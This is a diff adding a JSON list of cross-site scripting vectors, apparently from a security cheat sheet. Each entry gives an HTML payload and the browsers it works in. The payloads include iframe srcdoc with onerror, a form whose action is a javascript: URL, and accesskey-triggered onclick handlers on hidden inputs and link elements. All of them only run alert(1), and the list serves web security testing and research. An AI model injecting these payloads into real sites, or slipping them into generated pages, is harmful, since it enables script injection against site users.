@@ -1,0 +1,66 @@
+[
+    {
+        "description": "Using srcdoc attribute",
+        "code": "<iframe srcdoc=\"<img src=1 onerror=alert(1)>\"><\/iframe>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Using srcdoc with entities",
+        "code": "<iframe srcdoc=\"&lt;img src=1 onerror=alert(1)&gt;\"><\/iframe>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Click a submit element from anywhere on the page, even outside the form",
+        "code": "<form action=\"javascript:alert(1)\"><input type=submit id=x><\/form><label for=x>XSS<\/label>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Hidden inputs: Access key attributes can enable XSS on normally unexploitable elements",
+        "code": "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)",
+        "browsers": [
+            "firefox"
+        ]
+    },
+    {
+        "description": "Link elements: Access key attributes can enable XSS on normally unexploitable elements",
+        "code": "<link rel=\"canonical\" accesskey=\"X\" onclick=\"alert(1)\" \/> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)",
+        "browsers": [
+            "chrome"
+        ]
+    },
+    {
+        "description": "Download attribute can save a copy of the current webpage",
+        "code": "<a href=# download=\"filename.html\">Test<\/a>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Disable referrer using referrerpolicy",
+        "code": "<img referrerpolicy=\"no-referrer\" src=\"\/\/portswigger-labs.net\">",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    }
+]
